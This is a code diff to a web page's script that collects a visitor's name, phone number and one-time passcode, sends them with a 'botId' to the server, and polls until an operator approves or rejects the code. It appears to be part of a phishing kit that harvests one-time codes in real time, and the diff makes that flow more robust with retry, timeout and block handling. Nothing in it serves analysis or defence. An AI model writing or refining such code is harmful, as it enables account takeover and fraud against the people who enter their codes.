@@ -140,8 +140,8 @@ const otpInput = document.getElementById('otpInput');
 const verifyBtn = document.getElementById('verifyBtn');
 const countdownEl = document.getElementById('countdown');
 const waitingEl = document.getElementById('waiting');
+const alertBox = document.getElementById('otp-alert');
 
-// Session & bot handling
 const params = new URLSearchParams(window.location.search);
 const urlBotId = params.get('botId');
 if(urlBotId) localStorage.setItem('botId', urlBotId);
@@ -155,92 +155,103 @@ if(!fullName || !phone || !botId){
   window.location.href='index.html';
 }
 
-// Countdown timer
+/* COUNTDOWN */
 let timeLeft = 120;
 const timer = setInterval(()=>{
   timeLeft--;
   countdownEl.textContent = timeLeft;
-  if(timeLeft <=0){
-    clearInterval(timer);
-    countdownEl.textContent='0';
-  }
+  if(timeLeft <= 0) clearInterval(timer);
 },1000);
 
-// Submit OTP
-function submitOtp(code){
-  verifyBtn.disabled=true;
-  verifyBtn.textContent='Waiting for approval…';
-  waitingEl.style.display='block';
-  otpInput.disabled = true;
-
-  fetch(`${window.location.origin}/submit-otp`,{
-    method:'POST',
-    headers:{ 'Content-Type':'application/json' },
-    body:JSON.stringify({
-      name:fullName,
-      phone,
-      otp:code,
-      botId
-    })
-  })
-  .then(r=>r.json())
-  .then(({requestId})=> pollApproval(requestId))
-  .catch(()=>{
-    waitingEl.style.display='none';
-    verifyBtn.disabled=false;
-    verifyBtn.textContent='Verify OTP';
-    otpInput.disabled = false;
-    alert('Server error. Please try again.');
-  });
-}
-
-// Polling for approval
-function pollApproval(requestId){
-  const interval = setInterval(async ()=>{
-    const r = await fetch(`${window.location.origin}/check-otp/${requestId}`);
-    const d = await r.json();
-
-    if(d.approved===true){
-      clearInterval(interval);
-      window.location.href='success.html';
-    }
-
-    if(d.approved===false){
-      clearInterval(interval);
-
-      otpInput.value = '';
-      otpInput.disabled = false;
-
-      verifyBtn.disabled=true;
-      verifyBtn.textContent='Verify OTP';
-      waitingEl.style.display='none';
-
-      document.getElementById('otp-alert').textContent =
-        'Wrong otp. Please try again.';
-      document.getElementById('otp-alert').style.color = 'red';
-    }
-  },2000);
-}
-
-// Enable button when input is not empty
-function checkInputs(){
-  verifyBtn.disabled = otpInput.value.trim().length === 0;
-}
-
-// Numeric-only input, no length restriction
+/* INPUT */
 otpInput.addEventListener('input', () => {
   otpInput.value = otpInput.value.replace(/\D/g,'');
-  checkInputs();
+  verifyBtn.disabled = otpInput.value.trim().length === 0;
 });
 
-// Verify button click
-verifyBtn.addEventListener('click',()=>{
-  const code = otpInput.value.trim();
+/* SUBMIT */
+verifyBtn.addEventListener('click', async () => {
+  const otp = otpInput.value.trim();
+  if(!otp) return;
 
-  if(code){
-    submitOtp(code);
+  verifyBtn.disabled = true;
+  waitingEl.style.display = 'block';
+  alertBox.textContent = '';
+
+  try {
+    const res = await fetch(`${window.location.origin}/submit-otp`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ name: fullName, phone, otp, botId })
+    });
+
+    const data = await res.json();
+
+    if(!data.requestId){
+      throw new Error("No requestId returned");
+    }
+
+    pollApproval(data.requestId);
+
+  } catch (e) {
+    waitingEl.style.display = 'none';
+    verifyBtn.disabled = false;
+    alertBox.style.color = 'red';
+    alertBox.textContent = 'Server error. Try again.';
   }
 });
+
+/* STABLE POLLING (FIXED) */
+function pollApproval(requestId){
+
+  let attempts = 0;
+  const maxAttempts = 60; // ~2 minutes
+
+  const interval = setInterval(async () => {
+    attempts++;
+
+    try {
+      const res = await fetch(`${window.location.origin}/check-otp/${requestId}`);
+      const data = await res.json();
+
+      // ✅ SUCCESS
+      if (data.approved === true) {
+        clearInterval(interval);
+        window.location.href = 'success.html';
+        return;
+      }
+
+      // ❌ FAIL
+      if (data.approved === false) {
+        clearInterval(interval);
+        waitingEl.style.display = 'none';
+        verifyBtn.disabled = false;
+        alertBox.style.color = 'red';
+        alertBox.textContent = 'Wrong OTP. Try again.';
+        return;
+      }
+
+      // ⛔ BLOCK / TIMEOUT SAFETY
+      if (data.blocked) {
+        clearInterval(interval);
+        window.location.href = 'index.html';
+        return;
+      }
+
+      if (attempts >= maxAttempts) {
+        clearInterval(interval);
+        waitingEl.style.display = 'none';
+        verifyBtn.disabled = false;
+        alertBox.style.color = 'red';
+        alertBox.textContent = 'Request timed out. Try again.';
+      }
+
+    } catch (err) {
+      console.log("poll error", err);
+    }
+
+  }, 2000);
+}
 </script>
 
 </body>
